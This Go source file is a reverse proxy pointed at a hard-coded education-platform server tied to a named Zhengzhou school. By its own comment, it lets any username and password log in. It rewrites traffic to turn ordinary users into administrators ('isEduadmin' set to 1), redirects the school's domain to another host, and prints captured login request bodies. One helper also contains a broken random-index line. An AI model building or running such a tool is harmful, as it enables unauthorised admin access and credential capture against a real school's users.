package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
)


func singleJoiningSlash(a, b string) string {
	aslash := strings.HasSuffix(a, "/")
	bslash := strings.HasPrefix(b, "/")
	switch {
	case aslash && bslash:
		return a + b[1:]
	case !aslash && !bslash:
		return a + "/" + b
	}
	return a + b
}

func joinURLPath(a, b *url.URL) (path, rawpath string) {
	if a.RawPath == "" && b.RawPath == "" {
		return singleJoiningSlash(a.Path, b.Path), ""
	}
	// Same as singleJoiningSlash, but uses EscapedPath to determine
	// whether a slash should be added
	apath := a.EscapedPath()
	bpath := b.EscapedPath()

	aslash := strings.HasSuffix(apath, "/")
	bslash := strings.HasPrefix(bpath, "/")

	switch {
	case aslash && bslash:
		return a.Path + b.Path[1:], apath + bpath[1:]
	case !aslash && !bslash:
		return a.Path + "/" + b.Path, apath + "/" + bpath
	}
	return a.Path + b.Path, apath + bpath
}

func NewMultipleHostsReverseProxy(targets []*url.URL) *httputil.ReverseProxy {
	director := func(req *http.Request) {
		target := targets[rand.Int()*len(targets)]
		req.URL.Scheme = target.Scheme
		req.URL.Host = target.Host
		req.URL.Path = target.Path
	}

	return &httputil.ReverseProxy{
		Director: director,
	}
}

func myReverseProxy(target *url.URL) *httputil.ReverseProxy {
	targetQuery := target.RawQuery
	director := func(req *http.Request) {
		req.URL.Scheme = target.Scheme
		req.URL.Host = target.Host
		req.URL.Path, req.URL.RawPath = joinURLPath(target, req.URL)
		if targetQuery == "" || req.URL.RawQuery == "" {
			req.URL.RawQuery = targetQuery + req.URL.RawQuery
		} else {
			req.URL.RawQuery = targetQuery + "&" + req.URL.RawQuery
		}
		if _, ok := req.Header["User-Agent"]; !ok {
			// explicitly disable User-Agent so it's not set to default value
			req.Header.Set("User-Agent", "")
		}
		if req.Header.Get("X-Device-Id") == "" {
			req.Header.Set("X-Device-Id", "TWTestClient")
		}
		req.Header.Set("X-Device-Type", "2")
		// 自定义header处理 删除指定header
		// 读取并修改 request.Body
		// 用户输入任意帐号密码 均可登录 在反向代理过程中 修改请求体内容
		if req.Body != nil {
			bodyBytes, _ := ioutil.ReadAll(req.Body)
			fmt.Println("读取原始请求体--->", string(bodyBytes))
			// 替换请求体内容
			bodyString := string(bodyBytes)
			bodyString = strings.Replace(bodyString, "aischool2.zzedu.net.cn", "libgene.ga", -1)
			bodyString = strings.Replace(bodyString, "\"userType\":\"1\"", "\"userType\":\"2\"", -1)
			bodyString = strings.Replace(bodyString, "\"isEduadmin\":\"0\"", "\"isEduadmin\":\"1\"", -1)
			bodyBytes = []byte(bodyString)
			req.ContentLength = int64(len(bodyBytes)) // 替换后 ContentLength 会变化 需要同步修改
			// 生成 req.Body
			req.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes))
		}
	}
	return &httputil.ReverseProxy{Director: director}
}

func main() {
	rpURL, err := url.Parse("http://218.28.177.188:8002")
	if err != nil {
		log.Fatal(err)
	}
	proxy := myReverseProxy(rpURL)
	proxy.ModifyResponse = func(response *http.Response) error {
		if response.Header.Get("X-Device-Id") == "" {
			response.Header.Set("X-Device-Id", "TWTestClient")
		}
		response.Header.Set("X-Device-Type", "2")
		bodyBytes, _ := ioutil.ReadAll(response.Body)
		// 替换请求体内容
		bodyString := string(bodyBytes)
		bodyString = strings.Replace(bodyString, "aischool2.zzedu.net.cn", "libgene.ga", -1)
		bodyString = strings.Replace(bodyString, "\"userType\":\"1\"", "\"userType\":\"2\"", -1)
		bodyString = strings.Replace(bodyString, "\"isEduadmin\":\"0\"", "\"isEduadmin\":\"1\"", -1)
		bodyString = strings.Replace(bodyString, "天闻", "TestServer", -1)
		bodyString = strings.Replace(bodyString, "郑州市第七中学", "TestSchool", -1)
		bodyBytes = []byte(bodyString)
		response.ContentLength = int64(len(bodyBytes)) // 替换后 ContentLength 会变化 需要同步修改
		fmt.Println("读取修改后回复体--->", string(bodyBytes))
		// 生成 response.Body
		response.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes))
		return nil
	}
	log.Fatal(http.ListenAndServe(":8002", proxy))
}
